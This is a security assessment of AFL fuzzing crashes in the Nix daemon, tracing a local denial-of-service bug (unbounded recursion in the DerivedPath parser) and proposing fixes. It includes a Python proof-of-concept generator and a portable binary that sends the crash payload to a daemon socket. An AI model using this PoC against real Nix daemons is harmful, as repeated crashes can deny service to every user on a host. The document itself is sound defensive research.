# Security assessment: AFL crashes in `fuzz-daemon-message`

## Executive summary

The three crash artifacts in
`/tmp/opencode/nix-fuzz-parent/afl-out/default/crashes` are **the same bug**.
All are stack exhaustion caused by unbounded recursion in Nix's daemon-side
`DerivedPath` parser. The recursion is reachable from the `BuildPaths` worker
protocol operation, before any trust or repair-mode check is performed.
The third artifact was found later by continued fuzzing and was re-checked in
detail; it does not add a new vulnerability class (see "Crash 3" below).

**Verdict:** this is **not a memory-corruption or code-execution vulnerability**.
It is a **local denial-of-service** issue (CWE-674, uncontrolled recursion). A
user who is allowed to connect to the Nix daemon can send a crafted
`BuildPaths` request containing a derived-path string with enough `!` separators
to crash the per-connection daemon worker. Roughly 16,500–17,000 separator
bytes are sufficient with the default 8 MiB stack in this build.

The normal nix-daemon accepts a Unix-domain socket (default mode `0666`) and
defaults to `allowed-users = *`, so an unprivileged local user can reach this
path. The acceptor re-execs a fresh worker for every connection, so one crash
only kills that user's own worker. However, the acceptor aborts after 64 worker
crashes (`crashLimit = 64` in `src/nix/unix/daemon.cc`), so repeated malformed
connections can terminate the daemon acceptor for all users until it is
restarted (normally automatically by socket activation). There is no
confidentiality or integrity impact.

Typical severity: **Low** (local, availability-only, worker-isolated), rising to
**Medium** on hosts that depend continuously on the Nix daemon and lack rapid
automatic restart.

---

## Artifacts examined

| File | Size | AFL metadata |
| --- | ---: | --- |
| `id:000000,sig:11,src:000537,time:1844122,execs:3356703,op:havoc,rep:16` | 67,457 B | SIGSEGV, havoc mutation |
| `id:000001,sig:11,src:000352,time:2624085,execs:4712895,op:havoc,rep:7` | 29,948 B | SIGSEGV, havoc mutation |
| `id:000002,sig:11,src:000485,time:6751891,execs:13122095,op:havoc,rep:49` | 29,304 B | SIGSEGV, havoc mutation (found 2026-11-18 22:51) |

Verbatim copies of all three artifacts are saved in this repository under
`src/libstore-tests/fuzz/regression/` as `afl-id-000000.bin`,
`afl-id-000001.bin` and `afl-id-000002.bin` (sha256 respectively
`c8dee7139cf661961b68b34ca47887532267622ad208eddad7a7abd37a7bb8cb`,
`56247fa6c2502e7f590045c9b75e6ccb53590c9175dd6125a304d6c897292423`,
`efeaa17013299cc11411edf1b7dc1aeeeedf96df2d7570a94e8c27c8cea56981`).

All were found with:

```text
afl-fuzz -i src/libstore-tests/fuzz/data/daemon-messages \
         -o /tmp/opencode/nix-fuzz-parent/afl-out \
         -x src/libstore-tests/fuzz/daemon-messages.dict \
         -- /tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

The harness (`src/libstore-tests/fuzz/daemon-message.cc`) feeds the bytes to the
real daemon request parser, `nix::daemon::processConnection`, using a
`DummyStore`, `Trusted`, and `RecursiveFlag::Recursive`. No real store path or
build is touched.

---

## Reproduction

### No-ASAN AFL build (used for gdb)

```text
/tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

Meson options: `b_sanitize=none`, AFL libFuzzer-compatible driver.

### ASAN/libFuzzer build

```text
LD_LIBRARY_PATH=/usr/lib/llvm-22/lib/clang/22/lib/linux \
ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-22/bin/llvm-symbolizer \
/tmp/opencode/nix-fuzz-parent/build-libfuzzer/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message <input>
```

ASAN reports:

```text
ERROR: AddressSanitizer: stack-overflow
  #0 ...
  #1 __asan_memcpy
  #2 nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127
  #3 nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
  #4+ repeated frames at derived-path.cc:132
```

The classification is **stack-overflow**, not heap-buffer-overflow,
use-after-free, or invalid free.

---

## GDB backtraces

Command used for both inputs:

```sh
gdb -nx -q -batch \
  -ex 'set pagination off' \
  -ex 'set print frame-arguments none' \
  -ex 'set print repeats 0' \
  -ex 'handle SIGPIPE nostop noprint pass' \
  -ex 'run "<crash-file>"' \
  -ex 'bt -30' \
  /tmp/opencode/nix-fuzz-parent/build-afl-deny/src/libstore-tests/fuzz/harnesses/fuzz-daemon-message
```

### Crash 1 — `id:000000`

```text
Thread 1 "fuzz-daemon-mes" received signal SIGSEGV, Segmentation fault.
0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind (
    this=..., __str=..., __pos=..., __n=...) at .../bits/string_view.tcc:100

#0  0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view.tcc:100
#1  0x00007ffff75b01cd in std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view:484
#2  0x00007ffff75a6762 in nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127

#3 ... #16337  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
                 (~16,335 recursive frames)

#16338 nix::parseWith(...) at ../src/libstore/derived-path.cc:160
#16339 nix::DerivedPath::parseLegacy(...) at ../src/libstore/derived-path.cc:174
#16340 nix::WorkerProto::Serialise<nix::DerivedPath>::read(...) at ../src/libstore/worker-protocol.cc:212
#16341 nix::LengthPrefixedProtoHelper<nix::WorkerProto, std::vector<nix::DerivedPath>>::read(...) at length-prefixed-protocol-helper.hh:75
#16342 nix::WorkerProto::Serialise<std::vector<nix::DerivedPath>>::read(...) at worker-protocol-impl.hh:29
#16343 nix::daemon::performOp(...) at ../src/libstore/daemon.cc:593
#16344 nix::daemon::processConnection(...) at ../src/libstore/daemon.cc:1236
#16345 LLVMFuzzerTestOneInput(...) at ../src/libstore-tests/fuzz/daemon-message.cc:116
#16346 ExecuteFilesOnyByOne()
#16347 LLVMFuzzerRunDriver()
#16348 main()
```

### Crash 2 — `id:000001`

The second input produces the identical stack:

```text
Thread 1 "fuzz-daemon-mes" received signal SIGSEGV, Segmentation fault.
0x00007ffff75b02e8 in std::basic_string_view<char, std::char_traits<char> >::rfind (...)

#0  std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view.tcc:100
#1  std::basic_string_view<char, std::char_traits<char> >::rfind(...) at .../string_view:484
#2  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:127
#3 ... #16337  nix::parseWithSingle(...) at ../src/libstore/derived-path.cc:132
#16338 nix::parseWith(...) at ../src/libstore/derived-path.cc:160
#16339 nix::DerivedPath::parseLegacy(...) at ../src/libstore/derived-path.cc:174
#16340 nix::WorkerProto::Serialise<nix::DerivedPath>::read(...) at ../src/libstore/worker-protocol.cc:212
#16341 nix::LengthPrefixedProtoHelper<...>::read(...) at length-prefixed-protocol-helper.hh:75
#16342 nix::WorkerProto::Serialise<std::vector<nix::DerivedPath>>::read(...) at worker-protocol-impl.hh:29
#16343 nix::daemon::performOp(...) at ../src/libstore/daemon.cc:593
#16344 nix::daemon::processConnection(...) at ../src/libstore/daemon.cc:1236
#16345 LLVMFuzzerTestOneInput(...) at ../src/libstore-tests/fuzz/daemon-message.cc:116
#16346 ExecuteFilesOnyByOne()
#16347 LLVMFuzzerRunDriver()
#16348 main()
```

The only differences between the two runs were the writer-thread LWP ID and one
register value; the crash path and depth were the same.

### Crash 3 — `id:000002` (newer artifact)

Replayed under both harnesses. gdb shows the same signature: SIGSEGV in
`std::string_view::rfind`, then ~16,300 frames at `derived-path.cc:132`, followed
by `parseWith` → `parseLegacy` → `worker-protocol.cc:212` → `daemon.cc:593` →
`processConnection`. ASAN again reports:

```text
ERROR: AddressSanitizer: stack-overflow
  #1 __asan_memcpy
  #2 nix::parseWithSingle(...) at derived-path.cc:127
  #3+ repeated frames at derived-path.cc:132
```

The payload is 29,304 bytes of which 25,409 are `!` bytes (plus unrelated havoc
garbage) — the same recursive separator trigger, just a larger mutation. There
is no new bug class and no change to the risk assessment.

`afl-tmin` was attempted but timed out during its final character-minimization
stage. A structurally minimized reproducer was produced instead (see "Minimal
proof of concept" below).

---

## Root cause

`src/libstore/derived-path.cc`:

```cpp
static SingleDerivedPath parseWithSingle(
    const StoreDirConfig & store,
    std::string_view s,
    std::string_view separator,
    const ExperimentalFeatureSettings & xpSettings)
{
    size_t n = s.rfind(separator);                                  // line 127
    return n == s.npos
               ? (SingleDerivedPath) SingleDerivedPath::Opaque::parse(store, s)
               : (SingleDerivedPath) SingleDerivedPath::Built::parse(
                     store,
                     make_ref<const SingleDerivedPath>(
                         parseWithSingle(store, s.substr(0, n), separator, xpSettings)), // line 132
                     s.substr(n + 1),
                     xpSettings);
}
```

`parseWith()` at line 160 calls `parseWithSingle()` with separator `"!"`, and
`DerivedPath::parseLegacy()` at line 174 calls `parseWith()`.

For a wire string consisting of many `!` characters, `rfind("!")` always finds a
separator, so the function recurses on successively shorter prefixes. There is
no recursion-depth limit. Each frame is large enough that roughly 16.5k nested
calls exhaust the default 8 MiB stack.

The call from the daemon is:

```text
daemon.cc:593  auto drvs = WorkerProto::Serialise<DerivedPaths>::read(*store, rconn);
worker-protocol.cc:212  return DerivedPath::parseLegacy(store, s);
```

The `dynamic-derivations` experimental-feature check inside
`SingleDerivedPath::Built::parse()` (via `drvRequireExperiment`, line 101) is
evaluated only while unwinding, after the recursive descent has already
consumed the stack. It therefore does not prevent the crash.

---

## Minimal proof of concept

The harness input can be generated from the first 32 bytes of a valid seed
(magic, version 1.37, obsolete affinity and reserve fields), followed by the
`BuildPaths` opcode, a one-element vector, and a length-prefixed string of `!`
characters:

```python
import struct, pathlib

seed = pathlib.Path(
    'src/libstore-tests/fuzz/data/daemon-messages/is-valid-path.bin'
).read_bytes()[:32]

n = 17000
poc = bytearray(seed)
poc += struct.pack('<QQQ', 9, 1, n)      # op=BuildPaths, vector size=1, string length=n
poc += b'!' * n
poc += b'\0' * ((-n) % 8)                # wire padding to 8 bytes

pathlib.Path('/tmp/poc-buildpaths-stackoverflow.bin').write_bytes(poc)
```

Observed with the no-ASAN build under the default 8 MiB stack:

```text
n = 16000  -> exit 0
n = 16500  -> exit 139 (SIGSEGV)
n = 17000  -> exit 139 (SIGSEGV)
n = 20000  -> exit 139 (SIGSEGV)
```

A binary search over `n` with that build found the exact threshold at
**`n = 16319`** (16,376 bytes total); `n = 16318` exits normally. The ASAN build
crashes as well with `AddressSanitizer: stack-overflow`. The threshold depends on
stack rlimit and compiler instrumentation.

A margin-keeping reproducer at `n = 17000` (17,056 bytes) is stored as a
regression input at:

```text
src/libstore-tests/fuzz/regression/daemon-message-buildpaths-stackoverflow.bin
sha256 16b7c8d9d38bb9617d20559e3635da7c37fd7f63cdbf3ac13e5531c03e6099e1
```

It crashes both harnesses with the same stack as the original artifacts. It is
deliberately **not** placed in `data/daemon-messages/`, because that directory is
the seed corpus used by `packaging/fuzz-seed-check.nix`, which replays every seed
and expects no crash. See `src/libstore-tests/fuzz/README.md`.

For testing against a real nix-daemon, the repository root also contains a
single-file, statically linked PoC: `poc-static` (source `poc_embedded.c`). It
embeds those same 17,056 wire bytes and sends them to the daemon socket, so only
that one file needs to be copied to the target host:

```sh
./poc-static                        # /nix/var/nix/daemon-socket/socket
NIX_DAEMON_SOCKET_PATH=/run/nix/daemon-socket ./poc-static
./poc-static /path/to/daemon-socket
```

It prints whether the daemon worker closed the connection without a protocol
error (expected stack overflow) or replied with an error (bug fixed / request
rejected).

---

## Reachability in a real Nix install

* The daemon listens on a Unix-domain socket, by default
  `/nix/var/nix/daemon-socket/socket`, created with mode `0666`
  (`src/libcmd/include/nix/cmd/unix-socket-server.hh:53`).
* `allowed-users` defaults to `*` (`src/nix/unix/daemon.cc:85-100`), so any local
  user can connect. Such users are normally `NotTrusted`, but that does not
  matter here: the `BuildPaths` drv vector is parsed at `daemon.cc:593` before
  the `bmRepair && !trusted` check at `daemon.cc:606`.
* For protocol version >= 1.30, `WorkerProto::Serialise<DerivedPath>::read`
  uses `DerivedPath::parseLegacy`, i.e. the `!` separator path.
* The acceptor spawns a fresh re-exec'd worker per connection
  (`src/nix/unix/daemon.cc:410-471`). A single malicious request therefore
  crashes only that connection's worker.
* The acceptor tracks signal crashes and throws `AbortServeSocket` after
  `crashLimit = 64` crashes (`src/nix/unix/daemon.cc:333,397-406`). Repeated
  connections from one user can therefore terminate the daemon acceptor for all
  users until it is restarted.

The daemon is not network-facing by default. Remote exploitation requires an
explicit TCP-to-Unix-socket forward or an authenticated stdio/ssh transport;
ordinary remote attackers cannot reach this code.

---

## Exploitability assessment

### Code execution / memory corruption: **No**

* ASAN classifies the fault as `stack-overflow`, not an out-of-bounds write or
  use-after-free.
* The stack grows one ordinary frame at a time into its guard page; the kernel
  delivers SIGSEGV before any adjacent mapping or return address is overwritten
  by attacker-controlled data.
* The payload only controls the *number* of recursion steps and the string
  contents, not a pointer or a write destination.
* Workers are re-exec'd per connection, giving fresh ASLR and limiting the blast
  radius of a crashed worker.

### Denial of service: **Yes, local and limited**

* Any local user permitted to connect to the daemon can crash their own worker
  with a ~17 KB request.
* With ~64 such connections, the acceptor exits, denying service to other users
  until systemd/socket activation or manual intervention restarts it.
* No store corruption, privilege escalation, or data disclosure was observed.

---

## Recommendations

1. Add an explicit recursion-depth limit to `parseWithSingle()` and `parseWith()`
   (the draft patch below uses 1000 levels; a smaller value such as 64 or 128 is
   also defensible for legitimate derived paths) and throw a normal `Error` when
   exceeded.
2. Prefer rewriting the parser as an iterative loop that repeatedly splits on
   the last separator and builds the nested representation on the way back.
3. Optionally cap the accepted length of a worker-protocol `DerivedPath` string
   in `WorkerProto::Serialise<DerivedPath>::read`.
4. A regression reproducer has been added at
   `src/libstore-tests/fuzz/regression/daemon-message-buildpaths-stackoverflow.bin`.
   Once the depth cap lands, wire it into a negative test that expects a normal
   `Error` (not a signal). Do **not** add it to `data/daemon-messages/`: that is
   the seed corpus replayed by `packaging/fuzz-seed-check.nix`, which expects
   every seed to succeed.
5. Consider per-client crash accounting, or resetting the global crash counter,
   so a single abusive user cannot terminate the acceptor for everyone.
6. If reporting upstream, attach all three AFL artifacts and the minimal PoC
   generator above; all three reduce cleanly to the same recursion bug.
7. A draft, **unapplied** patch for recommendation 1 is at
   `/tmp/opencode/nix-fuzz-parent/fix-derived-path-recursion.patch`. It adds a
   depth cap (`maxDerivedPathDepth = 1000`) to `parseWithSingle()` and
   `parseWith()` and throws a normal `Error` when exceeded. It passes
   `git apply --check` but has not been committed to the source tree.
